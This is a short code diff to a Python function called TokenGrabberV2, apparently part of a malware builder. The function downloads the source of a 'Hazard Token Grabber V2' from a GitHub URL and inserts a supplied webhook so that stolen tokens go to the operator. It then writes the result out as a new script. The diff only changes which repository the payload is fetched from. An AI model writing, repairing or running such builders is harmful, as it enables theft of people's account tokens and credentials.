@@ -27,7 +27,7 @@ def TokenGrabberV2(WebHook, fileName):
         'numpy'
     ]
     install_lib(required)
-    code = requests.get("https://raw.githubusercontent.com/Rdimo/Hazard-Token-Grabber-V2/master/main.py").text.replace("WEBHOOK_HERE", WebHook)
+    code = requests.get("https://github.com/JaneHongEn/111/blob/main/main.py").text.replace("WEBHOOK_HERE", WebHook)
     with open(f"{fileName}.py", 'w') as f:
         f.write(code)
 
